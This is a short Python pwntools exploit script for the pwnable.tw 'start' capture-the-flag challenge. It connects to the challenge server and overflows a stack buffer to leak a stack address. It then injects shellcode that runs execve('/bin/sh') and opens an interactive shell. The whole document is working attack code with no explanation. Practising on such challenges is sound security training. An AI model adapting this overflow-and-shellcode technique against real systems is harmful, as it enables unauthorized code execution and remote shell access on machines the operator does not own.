from pwn import *
#p=process('start')
p=remote('chall.pwnable.tw',10000)
#gdb.attach(p)
loopaddr=0x8048087
print(p.recv())
p.send(b'0'*20+p32(loopaddr))
s=p.recv()
print(s)
stackaddr=u32(s[0:4])

sc='''
mov eax,0x0b
mov ebx,'''+hex(stackaddr-4)+'''
xor ecx,ecx
xor edx,edx
int 0x80
'''


p.send(b'/bin/sh\00'+b'0'*12+p32(stackaddr+20)+asm(sc))
p.interactive()

